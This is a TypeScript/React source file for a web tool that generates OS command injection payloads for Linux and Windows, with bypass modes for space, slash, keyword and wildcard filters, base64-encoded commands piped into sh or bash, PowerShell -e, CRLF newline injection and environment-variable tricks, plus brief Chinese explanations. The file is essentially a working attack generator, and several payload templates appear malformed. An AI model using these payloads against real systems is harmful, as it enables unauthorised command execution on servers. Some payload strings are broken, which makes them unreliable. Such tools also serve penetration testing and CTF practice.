import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

/* ============================================================
 * Command Injection Payload Generator
 * Generates payloads for Linux/Windows with various bypass modes.
 * ========================================================== */

interface BypassPayloads {
  title: string;
  payloads: string[];
}

const generateCmdi = (cmd: string, os: string, bypass: string): string => {
  const c = cmd.trim() || 'id';
  const lines: string[] = [];
  lines.push(`── 命令注入 Payload (${os}) ──`);
  lines.push(` [命令] ${c}`);
  lines.push(` [绕过] ${bypass}`);
  lines.push('');

  const groups: BypassPayloads[] = [];

  // Pipe-based injection
  if (bypass === 'none' || bypass === 'no-space') {
    groups.push({
      title: '管道符注入',
      payloads: os === 'Windows'
        ? [`| ${c}`, `|| ${c}`, `& ${c}`, `&& ${c}`]
        : [`| ${c}`, `|| ${c}`, `; ${c}`, `&& ${c}`],
    });
  }

  // Backtick / $()
  if (bypass === 'none' || bypass === 'no-space') {
    groups.push({
      title: '反引号 / 命令替换',
      payloads: os === 'Windows'
        ? [`& ${c}`, `${c}`]
        : [`${c}`, `$(${c})`, '${' + c + '}'],
    });
  }

  // No-space bypass
  if (bypass === 'no-space') {
    groups.push({
      title: '无空格绕过',
      payloads: os === 'Windows'
        ? [`|${c}`, `&${c}`, `${c}`, `|set\va=${c}&call%${c}`]
        : [`|${c}`, `;${c}`, `${'$'}{IFS}${c}`, `${'$'}{IFS}${'$'}(${c})`, `${c}`, `\t${c}`, `<${c}`],
    });
  }

  // No-slash bypass
  if (bypass === 'no-slash') {
    groups.push({
      title: '无斜杠绕过',
      payloads: os === 'Windows'
        ? [`|cd..&cd..&${c}`, `|pushd..&popd&${c}`]
        : [`|cd..;cd..;${c}`, `${'$'}{HOME}/../${c}`.replace('${c}', c), `${'$'}{PATH%%/*}/bin/sh`],
    });
  }

  // No-command-keyword bypass
  if (bypass === 'no-cmd') {
    groups.push({
      title: '无命令关键字绕过',
      payloads: os === 'Windows'
        ? [`|powershell -c "${c}"`, `|c${'\\'}m${'\\'}d /c ${c}`]
        : [`${'$'}{PATH%%/*}i${'$'}{PATH%%/*}/sh -c "${c}"`, `/'\''b'i'n'/'\''s'h -c "${c}"`, `${c}`],
    });
  }

  // Wildcard bypass
  if (bypass === 'wildcard') {
    groups.push({
      title: '通配符绕过',
      payloads: os === 'Windows'
        ? [`|p*wershell -c "${c}"`, `|c*d /c ${c}`]
        : [`/'\''b'i'n'/'\''s'h` , `/???/???/?? -c "${c}"`, `${'$'}{PATH%%/*}i${'$'}{PATH%%/*}/sh`],
    });
  }

  // Base64 bypass
  if (bypass === 'base64') {
    const b64 = btoa(c);
    groups.push({
      title: 'Base64 编码绕过',
      payloads: os === 'Windows'
        ? [`|powershell -e ${btoa('powershell -c ' + c)}`, `|certutil -decode - - | ${c}`]
        : [`|echo ${b64}|base64 -d|sh`, `|echo ${b64}|base64 -d|bash`, `${'$'}(echo ${b64}|base64 -d)`],
    });
  }

  // Newline injection
  groups.push({
    title: '换行符注入 (%0a / %0d%0a)',
    payloads: [`${c}%0a`, `%0d%0a${c}`, `\n${c}`, `\r\n${c}`],
  });

  // Environment variable concatenation
  groups.push({
    title: '环境变量拼接',
    payloads: os === 'Windows'
      ? [`|set a=${c}&call%a%`, `|set a=${c}&cmd /c%a%`]
      : [`a=${c};${'$'}a`, `x=${c};${'$'}{x}`, `${'$'}{IFS}${c}`],
  });

  // Output
  for (const g of groups) {
    lines.push(` ▸ ${g.title}:`);
    for (const p of g.payloads) {
      lines.push(`   ${p}`);
    }
    lines.push('');
  }

  lines.push(' 说明:');
  lines.push('  - 管道符 | 将前一条命令的输出作为后一条命令的输入');
  lines.push('  - && 表示前一条成功才执行后一条; || 表示前一条失败才执行');
  lines.push('  - 反引号 `cmd` 和 $(cmd) 都会执行命令替换');
  lines.push('  - %0a (LF) / %0d%0a (CRLF) 可在 HTTP 头/Cookie 中注入换行');
  lines.push('  - ${IFS} 是内部字段分隔符 (空格/Tab/换行), 用于绕过空格过滤');
  lines.push('  - 通配符 ? 匹配单字符, * 匹配任意字符, 绕过命令名过滤');
  return lines.join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="命令注入Payload"
    paramsConfig={[
      {
        name: 'os',
        label: '系统',
        type: 'select',
        default: 'Linux',
        options: [
          { value: 'Linux', label: 'Linux' },
          { value: 'Windows', label: 'Windows' },
        ],
      },
      {
        name: 'bypass',
        label: '绕过',
        type: 'select',
        default: 'none',
        options: [
          { value: 'none', label: '无' },
          { value: 'no-space', label: '无空格' },
          { value: 'no-slash', label: '无斜杠' },
          { value: 'no-cmd', label: '无命令关键字' },
          { value: 'wildcard', label: '通配符' },
          { value: 'base64', label: 'Base64' },
        ],
      },
    ]}
    execute={(input: string, _mode: string, params: Record<string, unknown>): string => {
      const os = (params.os as string) ?? 'Linux';
      const bypass = (params.bypass as string) ?? 'none';
      return generateCmdi(input, os, bypass);
    }}
  />
);
export default ToolComponent;
